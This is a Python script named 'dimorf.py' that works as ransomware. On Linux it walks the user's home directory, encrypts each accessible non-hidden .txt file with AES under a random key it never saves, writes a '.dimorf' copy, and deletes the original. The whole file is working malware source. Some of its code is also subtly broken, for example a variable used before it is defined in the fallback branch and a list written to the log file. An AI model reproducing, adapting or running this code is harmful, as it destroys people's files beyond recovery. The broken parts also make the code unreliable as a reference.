#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# pylint: skip-file

__author__ = 'Wendel Ortiz -> aKa Ort0x36'
__maintainer__ = 'Wendel Ortiz'
__credits__ = ['Contributors']
__module__ = 'dimorf.py'

import sys
import os
from Crypto.Cipher import AES
from Crypto import Random


def check_os(osname: str) -> str | None:
    USER_DIR = os.getenv(
        'HOME'
    )
    
    is_linux = [
        prop for prop in os.uname() if (
            (prop == "Linux")
        ) and ((sys.platform == "linux")) and (
            (os.name == osname)
        )
    ]

    if (is_linux):
        if (sys.version[0] == '3'):
            find_and_encrypt(
                path=USER_DIR,
                ext_files=['.txt'],
                hidden='.',
                new_ext='.dimorf',
                key=Random.get_random_bytes(32),
                block_bytes=65536
            )
        

def find_and_encrypt(
    path: str,
    ext_files: list,
    hidden: str,
    new_ext: str,
    key: bytes,
    block_bytes: int
) -> str | bytes | list | None:

    for root, dirs, files in os.walk(path):
        for file in files:
            end_with_ext = [
                ext for ext in ext_files if (
                    file.endswith(
                        ext
                    )
                )
            ]

            if ((end_with_ext) and not(
                file.startswith(
                    hidden
                )
            )):
                # verificando permissão
                if (
                    os.access(
                        os.path.join(
                            root,
                            file
                        ), os.F_OK
                    ) and (
                        os.access(
                            os.path.join(
                                root,
                                file
                            ), os.W_OK
                        )
                    ) and (
                        os.access(
                            os.path.join(
                                root,
                                file
                            ), os.R_OK
                        )
                    )):

                        # # iniciando operacoes criptograficas.
                        init_vector = Random.new().read(32)
                        cipher = AES.new(
                            key,
                            AES.MODE_EAX,
                            init_vector
                        )

                        with open(os.path.join(root, file), mode='rb') as f:
                            data = f.read(
                                block_bytes
                            )

                        with open(f'{os.path.join(root, file)}{new_ext}', mode='wb') as f:
                            if (
                                f.write(
                                    cipher.encrypt(
                                        data
                                    )
                                )
                            ):
                                print(f'\33[31mArquivo {os.path.join(root, file)} Encriptado.\33[0m')

                        os.remove(
                            os.path.join(
                                root,
                                file
                            )
                        )

                else:
                    if (
                        os.chmod(
                            os.path.join(
                                root,
                                file
                            ), 0o644
                        )
                    ):

                        try:
                            with open(os.path.join(root, file), mode='rb') as f:
                                data = f.read(
                                    block_bytes
                                )

                            with open(f'{os.path.join(root, file)}{new_ext}', mode='wb') as f:
                                if (
                                    f.write(
                                        cipher.encrypt(
                                            data
                                        )
                                    )
                                ):      
                                    print(f'\33[31mArquivo {os.path.join(root, file)} Encriptado.\33[0m')

                            os.remove(
                                os.path.join(
                                    root,
                                    file
                                )
                            )

                        except Exception:
                            if (not os.chmod(
                                    os.path.join(
                                        root,
                                        file
                                    ), 0o644
                                )
                            ):

                                logs = [
                                    ('Erro ao alterar permissões de arquivo.\n'),
                                    (f'Arquivos => {os.path.join(root, file)}\n')
                                ]

                                with open('log_dimorf.log', mode='w') as lf:
                                    if (
                                        lf.write(
                                            logs
                                        )
                                    ):      
                                        print(f'\33[32mLogs gerado em {lf}\33[0m')


if __name__ == '__main__':
    check_os(
        osname=os.name
    )
